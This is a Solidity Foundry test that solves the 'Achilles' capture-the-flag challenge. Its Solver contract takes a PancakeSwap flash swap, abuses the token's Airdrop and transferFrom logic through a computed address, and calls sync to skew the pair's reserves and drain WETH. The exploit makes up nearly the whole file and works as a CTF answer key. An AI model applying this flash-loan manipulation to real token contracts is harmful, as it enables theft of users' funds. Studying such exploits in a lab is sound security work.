pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SetUp} from "../lib/ctf/Achilles/contracts/SetUp.sol";
import {Achilles} from "../lib/ctf/Achilles/contracts/Achilles.sol";
import {WETH} from "../lib/ctf/Achilles/contracts/WETH.sol";
import {PancakePair, IPancakeCallee} from "../lib/ctf/Achilles/contracts/PancakeSwap.sol";

contract AchillesTest is Test {
    SetUp public _setUp;
    Solver public solver;

    function setUp() external {
        _setUp = new SetUp();
        solver = new Solver();

        vm.roll(114514);
    }

    function test_hackAchilles() public {
        solver.solve(_setUp);
        assertTrue(_setUp.isSolved());
    }
}

contract Solver is IPancakeCallee {
    Achilles private achilles;
    PancakePair private pair;

    function solve(SetUp setUp) external {
        achilles = setUp.achilles();
        pair = setUp.pair();

        uint256 swapAmount = 2000 ether; 
        pair.swap(swapAmount, 0, address(this), hex"aa");
        _collectAirdrop();
        pair.sync();

        pair.swap(0, 2000 ether, address(this), hex"ff");
        setUp.weth().transfer(msg.sender, 100 ether);

        selfdestruct(payable(msg.sender));
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata data) external override {
        require(msg.sender == address(pair), "Unauthorized sender");

        if (data[0] == hex"aa") {
            achilles.Airdrop(1 ether);  
            achilles.transfer(msg.sender, amount0);
            _collectAirdrop();  
        } else {
            achilles.transfer(msg.sender, 1 ether);
        }
    }

    function _collectAirdrop() private {
        address vanishingAddress;
        assembly {
            vanishingAddress := or(address(), number())
        }
        achilles.transferFrom(vanishingAddress, address(this), 0);
    }
}